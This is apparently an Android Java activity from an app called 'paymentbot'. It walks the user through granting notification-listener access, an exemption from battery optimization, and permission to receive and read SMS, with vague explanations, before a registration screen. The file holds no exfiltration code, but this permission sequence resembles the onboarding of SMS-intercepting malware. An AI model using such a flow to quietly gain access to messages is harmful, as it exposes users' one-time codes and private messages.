package com.example.paymentbot;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.core.app.ActivityCompat;

public class PermissionActivity extends Activity {

  private int currentPage = 1;

  @Override
  protected void onCreate(Bundle saved) {
    super.onCreate(saved);
    showPage(1);
  }

  private void showPage(int page) {
    currentPage = page;
    LinearLayout root = buildRoot();

    switch (page) {
      case 1: buildNotificationPage(root); break;
      case 2: buildBatteryPage(root); break;
      case 3: buildSmsPage(root); break;
    }

    setContentView(root);
  }

  private LinearLayout buildRoot() {
    LinearLayout root = new LinearLayout(this);
    root.setOrientation(LinearLayout.VERTICAL);
    root.setBackgroundColor(Color.WHITE);
    root.setLayoutParams(new ViewGroup
      .LayoutParams(-1, -1));

    // X close button top left
    TextView closeBtn = new TextView(this);
    closeBtn.setText("✕");
    closeBtn.setTextColor(0xFF333333);
    closeBtn.setTextSize(20);
    closeBtn.setPadding(dp(20), dp(40),
      dp(20), dp(20));
    closeBtn.setOnClickListener(
      v -> finish()
    );
    root.addView(closeBtn);

    return root;
  }

  private void buildNotificationPage(
    LinearLayout root
  ) {
    // Center content area
    LinearLayout content = new LinearLayout(this);
    content.setOrientation(LinearLayout.VERTICAL);
    content.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams cp =
      new LinearLayout.LayoutParams(-1, 0, 1f);
    content.setLayoutParams(cp);

    // Warning icon (blue triangle)
    TextView icon = new TextView(this);
    icon.setText("🔔");
    icon.setTextSize(64);
    icon.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams ip =
      new LinearLayout.LayoutParams(-2, -2);
    ip.gravity = Gravity.CENTER;
    ip.bottomMargin = dp(32);
    content.addView(icon, ip);

    // Title
    TextView title = new TextView(this);
    title.setText("Notification access required");
    title.setTextColor(0xFF1A1A1A);
    title.setTextSize(20);
    title.setTypeface(null,
      android.graphics.Typeface.BOLD);
    title.setGravity(Gravity.CENTER);
    title.setPadding(dp(32), 0, dp(32), 0);
    LinearLayout.LayoutParams tp =
      new LinearLayout.LayoutParams(-1, -2);
    tp.bottomMargin = dp(16);
    content.addView(title, tp);

    // Description
    TextView desc = new TextView(this);
    desc.setText(
      "To handle incoming notifications,\n" +
      "please allow access to notifications."
    );
    desc.setTextColor(0xFF666666);
    desc.setTextSize(15);
    desc.setGravity(Gravity.CENTER);
    desc.setPadding(dp(32), 0, dp(32), 0);
    content.addView(desc);

    root.addView(content);

    // Bottom button
    Button btn = buildBottomButton("Allow");
    btn.setOnClickListener(v -> {
      startActivity(new Intent(
        Settings
          .ACTION_NOTIFICATION_LISTENER_SETTINGS
      ));
    });
    root.addView(btn);
  }

  private void buildBatteryPage(
    LinearLayout root
  ) {
    LinearLayout content = new LinearLayout(this);
    content.setOrientation(LinearLayout.VERTICAL);
    content.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams cp =
      new LinearLayout.LayoutParams(-1, 0, 1f);
    content.setLayoutParams(cp);

    TextView icon = new TextView(this);
    icon.setText("⚠️");
    icon.setTextSize(64);
    icon.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams ip =
      new LinearLayout.LayoutParams(-2, -2);
    ip.gravity = Gravity.CENTER;
    ip.bottomMargin = dp(32);
    content.addView(icon, ip);

    TextView title = new TextView(this);
    title.setText("Battery optimization enabled");
    title.setTextColor(0xFF1A1A1A);
    title.setTextSize(20);
    title.setTypeface(null,
      android.graphics.Typeface.BOLD);
    title.setGravity(Gravity.CENTER);
    title.setPadding(dp(32), 0, dp(32), 0);
    LinearLayout.LayoutParams tp =
      new LinearLayout.LayoutParams(-1, -2);
    tp.bottomMargin = dp(16);
    content.addView(title, tp);

    TextView desc = new TextView(this);
    desc.setText(
      "To prevent the system from stopping\n" +
      "the application in the background,\n" +
      "disable battery optimization for the app."
    );
    desc.setTextColor(0xFF666666);
    desc.setTextSize(15);
    desc.setGravity(Gravity.CENTER);
    desc.setPadding(dp(32), 0, dp(32), 0);
    content.addView(desc);

    root.addView(content);

    Button btn = buildBottomButton("Disable");
    btn.setOnClickListener(v -> {
      Intent i = new Intent(
        Settings
          .ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
      );
      i.setData(Uri.parse(
        "package:" + getPackageName()
      ));
      startActivity(i);
    });
    root.addView(btn);
  }

  private void buildSmsPage(LinearLayout root) {
    LinearLayout content = new LinearLayout(this);
    content.setOrientation(LinearLayout.VERTICAL);
    content.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams cp =
      new LinearLayout.LayoutParams(-1, 0, 1f);
    content.setLayoutParams(cp);

    TextView icon = new TextView(this);
    icon.setText("💬");
    icon.setTextSize(64);
    icon.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams ip =
      new LinearLayout.LayoutParams(-2, -2);
    ip.gravity = Gravity.CENTER;
    ip.bottomMargin = dp(32);
    content.addView(icon, ip);

    TextView title = new TextView(this);
    title.setText("Additional permissions required");
    title.setTextColor(0xFF1A1A1A);
    title.setTextSize(20);
    title.setTypeface(null,
      android.graphics.Typeface.BOLD);
    title.setGravity(Gravity.CENTER);
    title.setPadding(dp(32), 0, dp(32), 0);
    LinearLayout.LayoutParams tp =
      new LinearLayout.LayoutParams(-1, -2);
    tp.bottomMargin = dp(16);
    content.addView(title, tp);

    TextView desc = new TextView(this);
    desc.setText(
      "Please provide the appropriate\n" +
      "permission for the proper handling\n" +
      "of incoming SMS messages."
    );
    desc.setTextColor(0xFF666666);
    desc.setTextSize(15);
    desc.setGravity(Gravity.CENTER);
    desc.setPadding(dp(32), 0, dp(32), 0);
    content.addView(desc);

    root.addView(content);

    Button btn = buildBottomButton("Grant");
    btn.setOnClickListener(v -> {
      ActivityCompat.requestPermissions(
        this,
        new String[]{
          android.Manifest.permission.RECEIVE_SMS,
          android.Manifest.permission.READ_SMS
        },
        100
      );
    });
    root.addView(btn);
  }

  @Override
  public void onRequestPermissionsResult(
    int requestCode,
    String[] permissions,
    int[] grantResults
  ) {
    super.onRequestPermissionsResult(
      requestCode, permissions, grantResults
    );
    if (requestCode == 100) {
      // Move to registration
      startActivity(new Intent(
        this, RegistrationActivity.class
      ));
      finish();
    }
  }

  @Override
  protected void onResume() {
    super.onResume();
    // Check if notification permission given
    // and advance pages
    if (currentPage == 1) {
      String flat = Settings.Secure.getString(
        getContentResolver(),
        "enabled_notification_listeners"
      );
      boolean notifEnabled = flat != null &&
        flat.contains(getPackageName());
      if (notifEnabled) showPage(2);
    } else if (currentPage == 2) {
      PowerManager pm = (PowerManager)
        getSystemService(POWER_SERVICE);
      if (pm.isIgnoringBatteryOptimizations(
          getPackageName())) {
        showPage(3);
      }
    }
  }

  private Button buildBottomButton(String text) {
    Button btn = new Button(this);
    btn.setText(text);
    btn.setTextColor(Color.WHITE);
    btn.setTextSize(16);
    btn.setTypeface(null,
      android.graphics.Typeface.BOLD);
    btn.setAllCaps(false);

    android.graphics.drawable.GradientDrawable bg =
      new android.graphics.drawable
        .GradientDrawable();
    bg.setColor(0xFF1565C0);
    bg.setCornerRadius(dp(12));
    btn.setBackground(bg);

    LinearLayout.LayoutParams lp =
      new LinearLayout.LayoutParams(-1, dp(56));
    lp.setMargins(dp(24), dp(16),
      dp(24), dp(40));
    btn.setLayoutParams(lp);
    return btn;
  }

  private int dp(int dp) {
    return Math.round(dp *
      getResources().getDisplayMetrics().density);
  }
}
